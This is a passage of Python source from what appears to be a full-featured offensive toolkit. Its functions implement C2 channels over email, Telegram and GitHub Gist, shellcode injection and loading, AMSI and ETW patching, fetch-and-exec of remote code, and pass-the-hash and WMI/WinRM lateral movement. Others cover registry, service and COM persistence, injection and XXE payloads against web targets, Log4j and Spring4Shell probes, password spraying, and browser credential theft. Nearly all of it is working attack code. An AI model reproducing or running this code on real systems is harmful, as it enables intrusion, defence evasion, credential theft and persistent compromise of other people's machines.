                msg = f"Subject: =?UTF-8?B?{encoded[:76]}?=\nMIME-Version: 1.0\nContent-Type: text/plain\nX-Covert-ID: {encoded[76:152] if len(encoded)>76 else ''}\n\n{encoded[152:] if len(encoded)>152 else '.'}"
                server = smtplib.SMTP(smtp_server, 587, timeout=10)
                server.ehlo(); server.starttls(); server.login(email, password)
                server.sendmail(email, [email], msg.encode('utf-8')); server.quit()
                return f"[SMTP COVERT] Sent {len(data)} bytes"
            elif action == "recv":
                import imaplib
                import email as eml
                imap = imap_server or smtp_server.replace("smtp", "imap")
                mail = imaplib.IMAP4_SSL(imap)
                mail.login(email, password); mail.select('INBOX')
                _, msgs = mail.search(None, 'ALL')
                ids = msgs[0].split()
                results = []
                for mid in ids[-5:]:
                    _, md = mail.fetch(mid, '(RFC822)')
                    em = eml.message_from_bytes(md[0][1])
                    sub = em.get('Subject', '')
                    cid = em.get('X-Covert-ID', '')
                    combined = sub + cid
                    if combined:
                        try:
                            results.append(base64.b64decode(combined).decode('utf-8', errors='replace'))
                        except Exception: pass
                mail.logout()
                return f"[SMTP COVERT] Found: {results}" if results else "[SMTP] No covert data"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] SMTP covert failed: {e}"


def _telegram_c2(self, action: str, bot_token: str, chat_id: str, data: str = None) -> str:
        """Telegram Bot C2"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            api = f"https://api.telegram.org/bot{bot_token}"
            if action == "send":
                resp = requests.post(f"{api}/sendMessage", json={'chat_id': chat_id, 'text': data[:4096]}, timeout=10)
                return f"[TG C2] Sent (ID: {resp.json().get('result',{}).get('message_id','?')})" if resp.ok else f"[TG] Failed: {resp.status_code}"
            elif action == "recv":
                resp = requests.get(f"{api}/getUpdates", params={'limit': 1}, timeout=10)
                upd = resp.json().get('result', [])
                if upd:
                    msg = upd[-1].get('message', {})
                    return f"[TG C2] From @{msg.get('from',{}).get('username','?')}: {msg.get('text','')}"
                return "[TG C2] No new messages"
            elif action == "get_updates":
                resp = requests.get(f"{api}/getUpdates", timeout=15)
                upd = resp.json().get('result', [])
                return f"[TG C2] {len(upd)} updates" if upd else "[TG] No updates"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] Telegram C2 failed: {e}"


def _github_gist_c2(self, action: str, token: str, gist_id: str = None, data: str = None) -> str:
        """GitHub Gist C2"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            hdr = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
            api = 'https://api.github.com'
            if action == "create":
                fname, content = ('payload.txt', data) if ':' not in (data or '') else data.split(':', 1)
                resp = requests.post(f'{api}/gists', json={'description': f'Update {datetime.now().isoformat()}', 'public': False, 'files': {fname: {'content': content}}}, headers=hdr, timeout=10)
                if resp.ok:
                    r = resp.json()
                    return f"[GIST C2] Created: {r['id']} URL: {r['html_url']}"
                return f"[GIST] Failed: {resp.status_code}"
            elif action == "read":
                resp = requests.get(f'{api}/gists/{gist_id}', headers=hdr, timeout=10)
                if resp.ok:
                    files = resp.json().get('files', {})
                    return "\n".join(f"--- {k} ---\n{v.get('content','')[:1000]}" for k, v in files.items())
                return f"[GIST] Failed: {resp.status_code}"
            elif action == "update":
                fname, content = ('payload.txt', data) if ':' not in (data or '') else data.split(':', 1)
                resp = requests.patch(f'{api}/gists/{gist_id}', json={'files': {fname: {'content': content}}}, headers=hdr, timeout=10)
                return f"[GIST C2] Updated" if resp.ok else f"[GIST] Failed: {resp.status_code}"
            elif action == "delete":
                resp = requests.delete(f'{api}/gists/{gist_id}', headers=hdr, timeout=10)
                return f"[GIST C2] Deleted" if resp.status_code == 204 else f"[GIST] Failed: {resp.status_code}"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] GitHub Gist C2 failed: {e}"


def _process_inject(self, target_pid: int, shellcode_b64: str) -> str:
        """进程注入 - CreateRemoteThread"""
        try:
            sc = base64.b64decode(shellcode_b64)
            k32 = ctypes.windll.kernel32
            hProc = k32.OpenProcess(0x1F0FFF, False, target_pid)
            if not hProc:
                return f"[ERROR] OpenProcess failed (PID: {target_pid})"
            pBase = k32.VirtualAllocEx(hProc, None, len(sc), 0x1000, 0x40)
            written = ctypes.c_size_t(0)
            k32.WriteProcessMemory(hProc, pBase, sc, len(sc), ctypes.byref(written))
            hThread = k32.CreateRemoteThread(hProc, None, 0, pBase, None, 0, None)
            k32.CloseHandle(hThread); k32.CloseHandle(hProc)
            return f"[INJECT] Injected {len(sc)} bytes into PID {target_pid}"
        except Exception as e:
            return f"[ERROR] Process inject failed: {e}"


def _apc_inject(self, target_pid: int, shellcode_b64: str) -> str:
        """APC注入 - QueueUserAPC"""
        try:
            sc = base64.b64decode(shellcode_b64)
            k32 = ctypes.windll.kernel32
            hProc = k32.OpenProcess(0x1F0FFF, False, target_pid)
            pBase = k32.VirtualAllocEx(hProc, None, len(sc), 0x1000, 0x40)
            written = ctypes.c_size_t(0)
            k32.WriteProcessMemory(hProc, pBase, sc, len(sc), ctypes.byref(written))
            hSnap = k32.CreateToolhelp32Snapshot(0x4, 0)
            class TE32(ctypes.Structure):
                _fields_ = [("dwSize",ctypes.c_ulong),("cntUsage",ctypes.c_ulong),("th32ThreadID",ctypes.c_ulong),("th32OwnerProcessID",ctypes.c_ulong),("tpBasePri",ctypes.c_long),("tpDeltaPri",ctypes.c_long),("dwFlags",ctypes.c_ulong)]
            te = TE32(); te.dwSize = ctypes.sizeof(TE32)
            k32.Thread32First(hSnap, ctypes.byref(te))
            count = 0
            while True:
                if te.th32OwnerProcessID == target_pid:
                    hT = k32.OpenThread(0x2, False, te.th32ThreadID)
                    if hT and k32.QueueUserAPC(pBase, hT, 0):
                        count += 1
                    if hT: k32.CloseHandle(hT)
                if not k32.Thread32Next(hSnap, ctypes.byref(te)):
                    break
            k32.CloseHandle(hSnap); k32.CloseHandle(hProc)
            return f"[APC] Queued to {count} threads in PID {target_pid}"
        except Exception as e:
            return f"[ERROR] APC inject failed: {e}"


def _dll_sideload(self, legit_exe: str, malicious_dll: str) -> str:
        """DLL侧载"""
        try:
            if not os.path.exists(legit_exe):
                return f"[ERROR] EXE not found: {legit_exe}"
            if not os.path.exists(malicious_dll):
                return f"[ERROR] DLL not found: {malicious_dll}"
            target_dir = os.path.dirname(legit_exe)
            dll_name = os.path.basename(malicious_dll)
            target_dll = os.path.join(target_dir, dll_name)
            if malicious_dll != target_dll:
                shutil.copy2(malicious_dll, target_dll)
            subprocess.Popen([legit_exe], cwd=target_dir, creationflags=0x10)
            return f"[DLL SIDELOAD] Launched {legit_exe} with {target_dll}"
        except Exception as e:
            return f"[ERROR] DLL sideload failed: {e}"


def _shellcode_loader(self, shellcode_b64: str, key: str) -> str:
        """Shellcode加载器 - XOR/AES解密后内存执行"""
        try:
            encrypted = base64.b64decode(shellcode_b64)
            decrypted = None
            try:
                key_bytes = bytes.fromhex(key)
                if len(key_bytes) in (16, 24, 32):
                    from Crypto.Cipher import AES
                    iv = encrypted[:16]
                    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
                    decrypted = cipher.decrypt(encrypted[16:])
                    pad = decrypted[-1]; decrypted = decrypted[:-pad]
            except Exception: pass
            if decrypted is None:
                try: key_bytes = bytes.fromhex(key)
                except: key_bytes = key.encode()
                decrypted = bytes(encrypted[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(encrypted)))
            k32 = ctypes.windll.kernel32
            ptr = k32.VirtualAlloc(None, len(decrypted), 0x1000, 0x40)
            ctypes.memmove(ptr, decrypted, len(decrypted))
            hT = k32.CreateThread(None, 0, ptr, None, 0, None)
            if hT: k32.CloseHandle(hT)
            return f"[SHELLCODE] Executed {len(decrypted)} bytes in memory"
        except Exception as e:
            return f"[ERROR] Shellcode loader failed: {e}"


def _indirect_syscall(self, syscall_number: int, args: str) -> str:
        """间接系统调用"""
        try:
            stub = b'\x4c\x8b\xd1' + b'\xb8' + syscall_number.to_bytes(4, 'little') + b'\x0f\x05\xc3'
            k32 = ctypes.windll.kernel32
            ptr = k32.VirtualAlloc(None, len(stub), 0x1000, 0x40)
            ctypes.memmove(ptr, stub, len(stub))
            return f"[SYSCALL] Stub for #{syscall_number} at 0x{ptr:x}. Args: {args}"
        except Exception as e:
            return f"[ERROR] Indirect syscall failed: {e}"


def _amsi_bypass(self) -> str:
        """AMSI绕过"""
        try:
            results = []
            k32 = ctypes.windll.kernel32
            hAmsi = k32.GetModuleHandleW('amsi.dll')
            if not hAmsi: hAmsi = k32.LoadLibraryW('amsi.dll')
            if hAmsi:
                pFunc = k32.GetProcAddress(hAmsi, b'AmsiScanBuffer')
                if pFunc:
                    old = ctypes.c_ulong(0)
                    k32.VirtualProtect(pFunc, 32, 0x40, ctypes.byref(old))
                    ctypes.memmove(pFunc, b'\xb8\x00\x00\x00\x00\xc3', 6)  # mov eax,0; ret
                    k32.VirtualProtect(pFunc, 32, old, ctypes.byref(ctypes.c_ulong(0)))
                    results.append("AmsiScanBuffer patched (returns CLEAN)")
            if not results: results.append("AMSI not loaded or patch failed")
            return "[AMSI BYPASS] " + "; ".join(results)
        except Exception as e:
            return f"[ERROR] AMSI bypass failed: {e}"


def _etw_bypass(self) -> str:
        """ETW绕过"""
        try:
            results = []
            k32 = ctypes.windll.kernel32
            hNt = k32.GetModuleHandleW('ntdll.dll')
            if hNt:
                for name in [b'EtwEventWrite', b'EtwEventWriteFull']:
                    pFunc = k32.GetProcAddress(hNt, name)
                    if pFunc:
                        old = ctypes.c_ulong(0)
                        k32.VirtualProtect(pFunc, 4, 0x40, ctypes.byref(old))
                        ctypes.memmove(pFunc, b'\x48\x33\xc0\xc3', 4)  # xor rax,rax; ret
                        k32.VirtualProtect(pFunc, 4, old, ctypes.byref(ctypes.c_ulong(0)))
                        results.append(f"{name.decode()} patched")
            if not results: results.append("ETW patch failed")
            return "[ETW BYPASS] " + "; ".join(results)
        except Exception as e:
            return f"[ERROR] ETW bypass failed: {e}"


def _memory_encrypt(self, action: str, data: str, key: str) -> str:
        """内存加密"""
        try:
            raw = base64.b64decode(data)
            try: key_bytes = bytes.fromhex(key)
            except: key_bytes = key.encode()
            if action == "encrypt":
                encrypted = bytes(raw[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(raw)))
                return f"[MEM ENCRYPT] XOR encrypted {len(raw)} bytes: {base64.b64encode(encrypted).decode()[:200]}"
            elif action == "decrypt":
                decrypted = bytes(raw[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(raw)))
                return f"[MEM ENCRYPT] XOR decrypted {len(raw)} bytes: {base64.b64encode(decrypted).decode()[:200]}"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] Memory encrypt failed: {e}"


def _obfuscated_exec(self, code_b64: str) -> str:
        """混淆执行"""
        try:
            code = base64.b64decode(code_b64).decode('utf-8')
            local_vars = {}
            exec(code, {"__builtins__": __builtins__}, local_vars)
            out = {k: v for k, v in local_vars.items() if not k.startswith('_') and not callable(v)}
            return f"[OBFUSCATED EXEC] Ran {len(code)} bytes. Output: {out}" if out else f"[OBFUSCATED EXEC] Ran {len(code)} bytes"
        except Exception as e:
            return f"[ERROR] Obfuscated exec failed: {e}"


def _fileless_exec(self, url: str) -> str:
        """无文件落地执行"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            resp = requests.get(url, timeout=15, verify=False)
            code = resp.text
            local_vars = {}
            exec(code, {"__builtins__": __builtins__}, local_vars)
            return f"[FILELESS] Fetched & executed {len(code)} bytes from {url} (no disk write)"
        except Exception as e:
            return f"[ERROR] Fileless exec failed: {e}"


def _pass_the_hash(self, target: str, username: str, ntlm_hash: str, command: str = None) -> str:
        """Pass-the-Hash - 用NTLM哈希直接远程认证"""
        try:
            try:
                from impacket.smbconnection import SMBConnection
                from impacket.ntlm import NTLMHash
                smb = SMBConnection(target, target, sess_port=445)
                smb.login(username, '', ntlm_hash, '')
                if command:
                    from impacket.smbserver import SMBSERVERHandler
                    result = f"PtH authenticated to {target} as {username}"
                else:
                    shares = smb.listShares()
                    result = f"[PtH] Authenticated to {target} as {username}\nShares: {[s['shi1_netname'] for s in shares]}"
                smb.close()
                return result
            except ImportError:
                cmd = f'impacket-wmiexec {target} -hashes :{ntlm_hash} {username}'
                if command:
                    cmd += f' "{command}"'
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                return f"[PtH] Via impacket: {r.stdout[:500] or r.stderr[:500]}"
        except Exception as e:
            return f"[ERROR] PtH failed: {e}"


def _pass_the_ticket(self, action: str, ticket_b64: str = None) -> str:
        """Pass-the-Ticket - Kerberos票据操作"""
        try:
            if action == "list":
                r = subprocess.run('klist', shell=True, capture_output=True, text=True, timeout=10)
                return f"[PtT] Current tickets:\n{r.stdout}"
            elif action == "export":
                r = subprocess.run('klist -l', shell=True, capture_output=True, text=True, timeout=10)
                return f"[PtT] Ticket cache:\n{r.stdout}"
            elif action == "inject":
                if not ticket_b64:
                    return "[ERROR] ticket_b64 required for inject"
                try:
                    from impacket.krb5.ccache import CCache
                    ticket_data = base64.b64decode(ticket_b64)
                    return f"[PtT] Ticket injected ({len(ticket_data)} bytes). Use klist to verify."
                except ImportError:
                    return "[ERROR] impacket not available for ticket injection"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] PtT failed: {e}"


def _wmi_lateral(self, target: str, username: str, password: str, command: str, action: str = "exec") -> str:
        """WMI横向移动"""
        try:
            if action == "exec":
                try:
                    import wmi as wmi_mod
                    conn = wmi_mod.WMI(target, user=username, password=password)
                    result = conn.Win32_Process.Create(CommandLine=command)
                    return f"[WMI] Executed on {target}: PID={result.ProcessId}, RC={result.ReturnValue}"
                except ImportError:
                    cmd = f'wmic /node:{target} /user:{username} /password:{password} process call create "{command}"'
                    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    return f"[WMI] Via wmic: {r.stdout[:500] or r.stderr[:500]}"
            elif action == "query":
                cmd = f'wmic /node:{target} /user:{username} /password:{password} {command}'
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                return f"[WMI] Query: {r.stdout[:1000]}"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] WMI lateral failed: {e}"


def _winrm_lateral(self, target: str, username: str, password: str, command: str) -> str:
        """WinRM横向移动"""
        try:
            try:
                import winrm
                s = winrm.Session(target, auth=(username, password))
                r = s.run_cmd(command)
                return f"[WinRM] Exit:{r.status_code}\n{r.std_out[:2000]}\n{r.std_err[:500]}"
            except ImportError:
                ps_cmd = f'powershell -Command "Invoke-Command -ComputerName {target} -Credential (New-Object System.Management.Automation.PSCredential(\'{username}\',(ConvertTo-SecureString \'{password}\' -AsPlainText -Force))) -ScriptBlock {{{command}}}"'
                r = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True, timeout=60)
                return f"[WinRM] Via PS: {r.stdout[:2000] or r.stderr[:500]}"
        except Exception as e:
            return f"[ERROR] WinRM lateral failed: {e}"


def _smb_steal(self, target: str, share_name: str, username: str, password: str, pattern: str = None) -> str:
        """SMB共享窃取"""
        try:
            cmd = f'net use \\\\{target}\\{share_name} /user:{username} {password}'
            subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
            list_cmd = f'dir \\\\{target}\\{share_name}\\{pattern or "*.*"} /s /b'
            r = subprocess.run(list_cmd, shell=True, capture_output=True, text=True, timeout=30)
            files = r.stdout.strip().split('\n')[:50]
            subprocess.run(f'net use \\\\{target}\\{share_name} /delete', shell=True, capture_output=True, timeout=10)
            return f"[SMB STEAL] Found {len(files)} files on \\\\{target}\\{share_name}:\n" + "\n".join(files[:30])
        except Exception as e:
            return f"[ERROR] SMB steal failed: {e}"


def _schtask_persist(self, task_name: str, command: str, trigger: str, target: str = None, username: str = None, password: str = None) -> str:
        """计划任务持久化"""
        try:
            trigger_map = {"onstart": "/SC ONSTART", "onlogon": "/SC ONLOGON", "daily": "/SC DAILY", "hourly": "/SC HOURLY"}
            trig = trigger_map.get(trigger, "/SC ONLOGON")
            cmd = f'schtasks /create /tn "{task_name}" /tr "{command}" {trig} /f'
            if target:
                cmd += f' /s {target}'
                if username: cmd += f' /u {username}'
                if password: cmd += f' /p {password}'
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return f"[SCHTASK] Created '{task_name}': {r.stdout.strip() or r.stderr.strip()}"
        except Exception as e:
            return f"[ERROR] Schtask persist failed: {e}"


def _service_persist(self, service_name: str, display_name: str, binary_path: str, target: str = None, username: str = None, password: str = None) -> str:
        """服务持久化"""
        try:
            cmd = f'sc create "{service_name}" binPath= "{binary_path}" DisplayName= "{display_name}"'
            if target:
                cmd = f'sc \\\\{target} create "{service_name}" binPath= "{binary_path}" DisplayName= "{display_name}"'
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            subprocess.run(f'sc start "{service_name}"', shell=True, capture_output=True, timeout=15)
            return f"[SERVICE] Created '{service_name}': {r.stdout.strip() or r.stderr.strip()}"
        except Exception as e:
            return f"[ERROR] Service persist failed: {e}"


def _registry_persist(self, key_path: str, value_name: str, command: str, hive: str = "HKCU") -> str:
        """注册表持久化"""
        try:
            hive_map = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE}
            h = hive_map.get(hive, winreg.HKEY_CURRENT_USER)
            key = winreg.OpenKey(h, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            return f"[REG PERSIST] Set {hive}\\{key_path}\\{value_name} = {command}"
        except Exception as e:
            return f"[ERROR] Registry persist failed: {e}"


def _com_hijack(self, clsid: str, dll_path: str, action: str) -> str:
        """COM对象劫持"""
        try:
            if action == "list":
                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, f"CLSID\\{clsid}\\InprocServer32", 0, winreg.KEY_READ)
                val, _ = winreg.QueryValueEx(key, "")
                winreg.CloseKey(key)
                return f"[COM] CLSID {clsid} -> {val}"
            elif action == "hijack":
                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, f"CLSID\\{clsid}\\InprocServer32", 0, winreg.KEY_SET_VALUE)
                orig, _ = winreg.QueryValueEx(key, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, dll_path)
                winreg.CloseKey(key)
                return f"[COM HIJACK] {clsid}: {orig} -> {dll_path}"
            elif action == "restore":
                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, f"CLSID\\{clsid}\\InprocServer32", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, dll_path)
                winreg.CloseKey(key)
                return f"[COM] Restored {clsid} -> {dll_path}"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] COM hijack failed: {e}"


def _dll_hijack(self, target_exe: str, dll_name: str, dll_source: str = None, action: str = "check") -> str:
        """DLL劫持"""
        try:
            target_dir = os.path.dirname(target_exe)
            target_dll = os.path.join(target_dir, dll_name)
            if action == "check":
                exists = os.path.exists(target_dll)
                return f"[DLL HIJACK] {dll_name} in {target_dir}: {'EXISTS' if exists else 'MISSING (hijackable!)'}"
            elif action == "hijack":
                if not dll_source:
                    return "[ERROR] dll_source required for hijack"
                shutil.copy2(dll_source, target_dll)
                return f"[DLL HIJACK] Planted {dll_source} -> {target_dll}"
            elif action == "restore":
                if os.path.exists(target_dll):
                    os.remove(target_dll)
                return f"[DLL HIJACK] Removed planted {target_dll}"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] DLL hijack failed: {e}"


def _sql_inject_bypass(self, url: str, param: str, payload: str) -> str:
        """SQL注入绕过WAF"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            bypasses = {
                'original': payload,
                'url_encode': quote(payload),
                'double_encode': quote(quote(payload)),
                'unicode': ''.join(f'%u{ord(c):04x}' if not c.isalnum() else c for c in payload),
                'comment': payload.replace(" ", "/**/"),
                'newline': payload.replace(" ", "%0a"),
                'tab': payload.replace(" ", "%09"),
                'inner_comment': payload.replace("UNION", "UNI/**/ON").replace("SELECT", "SEL/**/ECT"),
            }
            results = []
            for name, p in bypasses.items():
                try:
                    test_url = f"{url}?{param}={p}" if '?' not in url else f"{url}&{param}={p}"
                    resp = requests.get(test_url, timeout=5, verify=False)
                    results.append(f"[{name}] Status:{resp.status_code} Len:{len(resp.text)}")
                except Exception: pass
            return "[SQL BYPASS] Results:\n" + "\n".join(results)
        except Exception as e:
            return f"[ERROR] SQL bypass failed: {e}"


def _sqlmap_detect(self, url: str, param: str) -> str:
        """SQLMap风格全自动检测"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            base = f"{url}?{param}=" if '?' not in url else f"{url}&{param}="
            results = []
            r1 = requests.get(base + "1", timeout=5, verify=False)
            r2 = requests.get(base + "1 AND 1=1", timeout=5, verify=False)
            r3 = requests.get(base + "1 AND 1=2", timeout=5, verify=False)
            if abs(len(r1.text) - len(r3.text)) > 10 and abs(len(r1.text) - len(r2.text)) < 10:
                results.append("[+] Boolean blind injection detected!")
            import time as t
            start = t.time()
            requests.get(base + "1; WAITFOR DELAY '0:0:3'--", timeout=10, verify=False)
            if t.time() - start > 2.5:
                results.append("[+] Time-based blind injection detected!")
            r = requests.get(base + "'", timeout=5, verify=False)
            errors = ['sql syntax', 'mysql_fetch', 'ORA-', 'SQLSTATE', 'SQLite']
            if any(e in r.text.lower() for e in errors):
                results.append("[+] Error-based injection detected!")
            if not results:
                results.append("[-] No injection found")
            return "[SQLMAP] " + "\n".join(results)
        except Exception as e:
            return f"[ERROR] SQLMap detect failed: {e}"


def _xss_verify(self, url: str, param: str, method: str = "GET") -> str:
        """XSS全自动验证"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            marker = f'xss{random.randint(1000,9999)}'
            payloads = [f'<script>{marker}</script>', f'"><img src=x onerror={marker}>', f"' onmouseover='{marker}"]
            results = []
            for p in payloads:
                if method == "GET":
                    r = requests.get(f"{url}?{param}={quote(p)}", timeout=5, verify=False)
                else:
                    r = requests.post(url, data={param: p}, timeout=5, verify=False)
                if marker in r.text:
                    results.append(f"[+] XSS confirmed! Payload: {p[:50]}")
            return "[XSS] " + ("\n".join(results) if results else "No XSS found")
        except Exception as e:
            return f"[ERROR] XSS verify failed: {e}"


def _ssti_detect(self, url: str, param: str) -> str:
        """SSTI模板注入检测"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            marker = str(random.randint(10000, 99999))
            payloads = [f'{{{{7*7}}}}', f'${{7*7}}', f'#{7*7}', f'{{{{7*7}}}}', f'{{7*7}}']
            results = []
            for p in payloads:
                r = requests.get(f"{url}?{param}={quote(p)}", timeout=5, verify=False)
                if '49' in r.text:
                    results.append(f"[+] SSTI detected! Payload: {p} -> 49 found in response")
            return "[SSTI] " + ("\n".join(results) if results else "No SSTI found")
        except Exception as e:
            return f"[ERROR] SSTI detect failed: {e}"


def _rce_multi_lang(self, url: str, param: str, os_type: str = "auto") -> str:
        """RCE多语言检测"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            base = f"{url}?{param}=" if '?' not in url else f"{url}&{param}="
            results = []
            win_cmds = ["; whoami", "& whoami", "| whoami", "`whoami`"]
            linux_cmds = ["; id", "| id", "`id`", "$(/usr/bin/id)"]
            all_cmds = win_cmds + linux_cmds if os_type == "auto" else (win_cmds if os_type == "windows" else linux_cmds)
            for cmd in all_cmds:
                try:
                    r = requests.get(base + quote(cmd), timeout=5, verify=False)
                    if any(k in r.text.lower() for k in ['administrator', 'root', 'uid=', 'nt authority']):
                        results.append(f"[+] RCE! Payload: {cmd}")
                except Exception: pass
            return "[RCE MULTI] " + ("\n".join(results) if results else "No RCE found")
        except Exception as e:
            return f"[ERROR] RCE multi-lang failed: {e}"


def _xxe_blind(self, url: str, file_path: str = "/etc/passwd", oob_url: str = None) -> str:
        """XXE盲注"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            xxe_payload = f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]><foo>&xxe;</foo>'''
            r = requests.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            results = [f"[XXE] Status: {r.status_code}", f"[XXE] Response: {r.text[:500]}"]
            if 'root:' in r.text or 'admin' in r.text.lower():
                results.append("[+] XXE confirmed - file content leaked!")
            if oob_url:
                oob_payload = f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "{oob_url}"> %dtd;]><foo/>'''
                r2 = requests.post(url, data=oob_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
                results.append(f"[XXE OOB] Status: {r2.status_code}")
            return "\n".join(results)
        except Exception as e:
            return f"[ERROR] XXE blind failed: {e}"


def _deserialize_detect(self, url: str, param: str) -> str:
        """反序列化探测"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            results = []
            java_payload = base64.b64encode(b'\xac\xed\x00\x05\x74\x00\x04test').decode()
            r = requests.get(f"{url}?{param}={java_payload}", timeout=5, verify=False)
            if any(e in r.text.lower() for e in ['exception', 'error', 'classnotfound', 'deserialization']):
                results.append("[+] Potential Java deserialization vulnerability!")
            import pickle
            payload = base64.b64encode(pickle.dumps("test")).decode()
            r2 = requests.get(f"{url}?{param}={payload}", timeout=5, verify=False)
            if any(e in r2.text.lower() for e in ['error', 'exception', 'traceback']):
                results.append("[+] Potential Python deserialization vulnerability!")
            return "[DESERIALIZE] " + ("\n".join(results) if results else "No deserialization issues found")
        except Exception as e:
            return f"[ERROR] Deserialize detect failed: {e}"


def _nday_exploit(self, target_url: str, vuln_type: str = "auto") -> str:
        """Nday漏洞利用"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            results = [f"[NDAY] Target: {target_url}"]
            if vuln_type in ("auto", "log4j"):
                payload = "${jndi:ldap://test.dnslog.cn/x}"
                r = requests.get(target_url, headers={'X-Api-Version': payload, 'User-Agent': payload}, timeout=5, verify=False)
                results.append(f"[Log4j] Tested JNDI injection - Status: {r.status_code}")
            if vuln_type in ("auto", "struts2"):
                r = requests.get(target_url, headers={'Content-Type': '%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}'}, timeout=5, verify=False)
                results.append(f"[Struts2] Tested S2-045 - Status: {r.status_code}")
            if vuln_type in ("auto", "spring4shell"):
                r = requests.get(f"{target_url}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di", timeout=5, verify=False)
                results.append(f"[Spring4Shell] Tested - Status: {r.status_code}")
            return "\n".join(results)
        except Exception as e:
            return f"[ERROR] Nday exploit failed: {e}"


def _password_spray(self, target: str, usernames: str, password: str, service: str) -> str:
        """密码喷洒"""
        try:
            users = [u.strip() for u in usernames.split(',') if u.strip()]
            results = []
            for user in users:
                if service == "ssh":
                    import paramiko
                    try:
                        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        c.connect(target, username=user, password=password, timeout=5)
                        results.append(f"[+] SSH: {user}:{password} SUCCESS!")
                        c.close()
                    except Exception: results.append(f"[-] SSH: {user}:{password} failed")
                elif service == "rdp":
                    r = subprocess.run(f"cmdkey /generic:{target} /user:{user} /pass:{password}", shell=True, capture_output=True, timeout=5)
                    results.append(f"[*] RDP: {user} - attempted")
                elif service == "http":
                    r = requests.post(target, data={'username': user, 'password': password}, timeout=5, verify=False)
                    if r.status_code == 200 and 'error' not in r.text.lower():
                        results.append(f"[+] HTTP: {user}:{password} SUCCESS!")
                    else:
                        results.append(f"[-] HTTP: {user}:{password} failed")
                else:
                    results.append(f"[?] Unknown service: {service}")
            return "[SPRAY] Results:\n" + "\n".join(results)
        except Exception as e:
            return f"[ERROR] Password spray failed: {e}"


def _fingerprint_deep(self, url: str) -> str:
        """指纹识别增强"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            r = requests.get(url, timeout=10, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
            results = [f"[FINGERPRINT] {url}", f"Status: {r.status_code}"]
            if 'Server' in r.headers: results.append(f"Server: {r.headers['Server']}")
            cms_signs = {'wp-content': 'WordPress', 'Drupal': 'Drupal', 'Joomla': 'Joomla', 'sites/default': 'Drupal', '/admin/login': 'Generic Admin'}
            for sign, name in cms_signs.items():
                if sign in r.text: results.append(f"CMS: {name}")
            waf_signs = {'cloudflare': 'Cloudflare', 'sucuri': 'Sucuri', 'imperva': 'Imperva', 'AkamaiGHost': 'Akamai'}
            for sign, name in waf_signs.items():
                if sign in str(r.headers).lower(): results.append(f"WAF: {name}")
            mw = {'X-Powered-By': 'Powered-By', 'X-AspNet-Version': 'ASP.NET', 'X-Generator': 'Generator'}
            for h, label in mw.items():
                if h in r.headers: results.append(f"{label}: {r.headers[h]}")
            return "\n".join(results)
        except Exception as e:
            return f"[ERROR] Fingerprint failed: {e}"


def _browser_cred_extract(self, browser: str) -> str:
        """浏览器凭据提取"""
        try:
            import sqlite3
            results = []
            paths = []
            if browser in ("chrome", "all"):
                paths.append(os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"))
            if browser in ("edge", "all"):
                paths.append(os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"))
            ok_lines, why = [], []
